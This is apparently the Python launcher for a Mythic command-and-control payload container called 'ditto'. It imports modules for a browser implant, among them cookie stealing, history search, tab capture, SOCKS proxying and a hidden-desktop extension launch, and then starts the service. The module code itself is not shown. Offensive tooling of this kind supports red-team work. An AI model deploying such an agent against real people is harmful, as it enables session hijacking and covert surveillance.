#!/usr/bin/env python3

import mythic_container

from ditto import builder
from ditto.commands import (
    capture_tab,
    close_iwa_extension,
    dns_lookup,
    exit_cmd,
    get_cookies,
    history_search,
    iwa_control,
    iwa_ping,
    iwa_start_socks,
    iwa_status,
    iwa_stop_socks,
    launch_iwa_extension,
    launch_iwa_hidden_desktop,
    list_tabs,
    ping,
    sleep,
    socks,
)


mythic_container.mythic_service.start_and_run_forever()
